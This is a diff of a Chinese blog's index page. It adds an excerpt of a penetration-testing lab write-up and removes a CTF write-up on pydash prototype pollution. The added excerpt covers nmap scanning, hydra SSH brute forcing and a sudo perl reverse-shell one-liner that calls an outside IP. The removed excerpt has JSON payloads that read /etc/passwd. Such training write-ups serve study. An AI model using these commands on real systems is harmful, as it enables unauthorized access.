@@ -161,6 +161,61 @@
     <div class="cube-content">
         <div class="cube-left">
             
+<div class="cube-excerpt" id="cube-excerpt-xiaoBaChang">
+    <header class="cube-excerpt-header">
+        <h1><a href="/2024/07/31/xiaoBaChang/">xiaoBaChang</a></h1>
+        <div class="cube-excerpt-header-msg">
+            <div class="cube-excerpt-date">
+                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                2024-07-31
+            </div>
+            <div class="cube-excerpt-tags">
+                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+                
+            </div>
+        </div>
+    </header>
+    <article class="cube-excerpt-entry cube-markdown">
+        
+        
+           <p>1</p>
+<p>已知网段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -I 网断名 -l</span><br><span class="line"></span><br><span class="line">nmap -sP 192.168.56.0/24   看ip</span><br><span class="line"></span><br><span class="line">nmap -p- 192.168.56.103    看端口</span><br><span class="line"></span><br><span class="line">nmap -p22,80 -sV 192.168.56.103  看这两个端口的信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/xiaoBaChang/1.png" alt="xiaoBaChang"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p21 -sC 192.168.49.103 用nmap的默认脚本来扫漏洞</span><br></pre></td></tr></table></figure>
+
+<p>相当于匿名登陆</p>
+<p>看到这个Anonymous 知道这个ftp服务可以匿名登陆 ，（账号密码都是 Anonymous）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22 -sC 192.168.49.103 用nmap的默认脚本来扫漏洞</span><br><span class="line">没啥漏洞</span><br><span class="line">nmap -p80 -sC 192.168.49.103 用nmap的默认脚本来扫漏洞</span><br><span class="line">这个只是看到html的主题，没扫到漏洞</span><br><span class="line"></span><br><span class="line">ftp 192.168.56.130 回车 输入账号密码</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">发现一个jpg图片</span><br><span class="line">get 1.jpg   把它下下来</span><br><span class="line">cd /   发现被限制在一个目录下</span><br><span class="line">quit 退出</span><br><span class="line">gwenview 1.jpg  kali的工具直接看图片</span><br></pre></td></tr></table></figure>
+
+<p>看网站  源代码也没</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.103 -x 403(403是没权限) --rangen-agent</span><br></pre></td></tr></table></figure>
+
+<p>看到301看一下  发现源码没东西到但是莫名出现了好多行 下面一个密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo root &gt; user.txt</span><br><span class="line">cp /usr/share/wordlists/rockyou.txt  .       /usr/share/wordlists/rockyou.txt是kali自带的密码字典</span><br><span class="line"> </span><br><span class="line"> nmap --script ssh-brute --script-args userdb=user.txt,passdb=rockyou.txt 192.168.56.103</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>查看图片的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings 1.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/xiaoBaChang/2.png" alt="xiaoBaChang"></p>
+<p>这个跟图片的格式不太对 ，应该有一些东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">steghide info 1.jpg</span><br><span class="line">要密码，web网站刚好发现了一个密码输入，刚好</span><br><span class="line">有一个data.txt</span><br><span class="line">steghide extract -sf 1.jpg  把这个data.txt给搞出来</span><br><span class="line">说 renu的密码太简单了</span><br><span class="line">那把user.txt的root替换成renu</span><br><span class="line"> nmap --script ssh-brute --script-args userdb=user.txt,passdb=rockyou.txt 192.168.56.103</span><br><span class="line">发现跑的好慢</span><br><span class="line">那用专业的爆ssh的工具</span><br><span class="line">hydra -L renu -P rockyou.txt 192.168.56.103 ssh</span><br><span class="line">直接爆出来了  987654321密码</span><br><span class="line">ssh renu@192.168.56.103</span><br><span class="line">看一下有没有sudo -s 的权限 ，有的话直接获取root权限</span><br><span class="line">有一些可以通过他的内核来看他的操作系统版本漏洞来提权</span><br><span class="line">history</span><br><span class="line">看到他生成公钥 rsa.pub</span><br><span class="line">cd .ssh/</span><br><span class="line">ls</span><br><span class="line">cat id_rsa.pub  看公钥</span><br><span class="line">知道 /home/lily有一个user2.txt</span><br><span class="line">cd /home/lily</span><br><span class="line">cat user2.txt 是一个flag</span><br><span class="line">ssh lily@127.0.0.1</span><br><span class="line">他免密登录</span><br><span class="line">那lily肯定有他的公钥</span><br><span class="line">cd .ssh/</span><br><span class="line">ls</span><br><span class="line">下面一个文件 cat 发现是renu的公钥</span><br><span class="line"></span><br><span class="line">直接</span><br><span class="line">ssh lily@127.0.0.1 直接免密登录</span><br><span class="line">sudo -s 要密码，那好像切不了root</span><br><span class="line">history</span><br><span class="line">看到用sudo -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/31/xiaoBaChang/3.png" alt="xiaoBaChang"></p>
+<p>&#x2F;usr&#x2F;bin&#x2F;perl 不用密码  all权限</p>
+<p>perl是一个脚本语言</p>
+<p>sudo perl -e ‘$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,”174.0.231.61:6666”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvnp 6666</span><br><span class="line">连上就是root权限</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">没东西(被隐藏)</span><br><span class="line">cat /root/.root.txt 得到flag</span><br><span class="line"></span><br><span class="line">cd /home</span><br><span class="line">cd renu</span><br><span class="line">ls</span><br><span class="line">cat user1.txt </span><br></pre></td></tr></table></figure>
+
+
+        
+    </article>
+    <footer class="cube-excerpt-footer">
+        <a class="cube-excerpt-more" href="/2024/07/31/xiaoBaChang/">Read More</a>
+    </footer>
+</div>
+
 <div class="cube-excerpt" id="cube-excerpt-DC9-Try">
     <header class="cube-excerpt-header">
         <h1><a href="/2024/07/30/DC9-Try/">DC9-Try</a></h1>
@@ -396,51 +451,6 @@
     </footer>
 </div>
 
-<div class="cube-excerpt" id="cube-excerpt-ciscn sanic py原型链污染">
-    <header class="cube-excerpt-header">
-        <h1><a href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">ciscn sanic py原型链污染</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                2024-07-08
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-            </div>
-        </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
-        
-        
-           <h1 id="1分析源码"><a href="#1分析源码" class="headerlink" title="1分析源码"></a>1分析源码</h1><p>这里会调用**pydash.set_**函数，而且我们看到源码中特意标注了一个pydash&#x3D;&#x3D;5.1.2，很明显这里存在一个漏洞点，其实也就是一个python的原型链污染了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">from sanic_session import Session</span><br><span class="line">import pydash</span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/login&quot;)</span><br><span class="line">async def login(request):</span><br><span class="line">    user = request.cookies.get(&quot;user&quot;)</span><br><span class="line">    if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="line">        request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="line">        return text(&quot;login success&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;login fail&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def admin(request):</span><br><span class="line">    if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="line">        key = request.json[&#x27;key&#x27;]</span><br><span class="line">        value = request.json[&#x27;value&#x27;]</span><br><span class="line">        if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            return text(&quot;success&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line">    return text(&quot;forbidden&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>先cookie赋值adm;n 把 ；用\073  8进制编码绕过</p>
-<p>登录</p>
-<h1 id="2任意读"><a href="#2任意读" class="headerlink" title="2任意读"></a>2任意读</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/src&quot;)</span><br><span class="line">async def src(request):</span><br><span class="line">    return text(open(__file__).read())</span><br></pre></td></tr></table></figure>
-
-<p>看到这个 __file__知道是任意文件读取</p>
-<p>这个是json方式(这个必须用bp空一行)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了 _.可以用 _\\\\. 绕过</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init-_\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" alt="ciscn-sanic-py原型链污染"></p>
-<p>随后访问&#x2F;src即读出内容</p>
-<p>尝试读取&#x2F;flag（不太行）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/flag&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="3于是要想看-下的目录"><a href="#3于是要想看-下的目录" class="headerlink" title="3于是要想看&#x2F;下的目录"></a>3于是要想看&#x2F;下的目录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure>
-
-<p>注意访问方式 &#x2F;static&#x2F;</p>
-        
-    </article>
-    <footer class="cube-excerpt-footer">
-        <a class="cube-excerpt-more" href="/2024/07/08/ciscn-sanic-py%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Read More</a>
-    </footer>
-</div>
-
 
 
 <ul class="cube-pagination cube-pagination-6">
@@ -510,7 +520,7 @@
     
     
     <div class="count">
-        <a class="count articles"><span>16</span>Article</a>
+        <a class="count articles"><span>17</span>Article</a>
         <a class="count tags"><span>0</span>Tags</a>
         <a class="count categories"><span>0</span>Categories</a>
     </div>
@@ -549,7 +559,7 @@
                     <span>1</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/30/DC9-Try/" title="DC9-Try">DC9-Try</a>
+                    <a href="/2024/07/31/xiaoBaChang/" title="xiaoBaChang">xiaoBaChang</a>
                 </p>
             </div>
             
@@ -563,7 +573,7 @@
                     <span>2</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/30/DC8-Try/" title="DC8-Try">DC8-Try</a>
+                    <a href="/2024/07/30/DC9-Try/" title="DC9-Try">DC9-Try</a>
                 </p>
             </div>
         </li>
@@ -576,7 +586,7 @@
                     <span>3</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/29/DC7-Try/" title="DC7-Try">DC7-Try</a>
+                    <a href="/2024/07/30/DC8-Try/" title="DC8-Try">DC8-Try</a>
                 </p>
             </div>
         </li>
@@ -589,7 +599,7 @@
                     <span>4</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/29/DC6-Try/" title="DC6-Try">DC6-Try</a>
+                    <a href="/2024/07/29/DC7-Try/" title="DC7-Try">DC7-Try</a>
                 </p>
             </div>
         </li>
@@ -602,7 +612,7 @@
                     <span>5</span>
                 </p>
                 <p class="title">
-                    <a href="/2024/07/28/DC5-Try/" title="DC5-Try">DC5-Try</a>
+                    <a href="/2024/07/29/DC6-Try/" title="DC6-Try">DC6-Try</a>
                 </p>
             </div>
         </li>
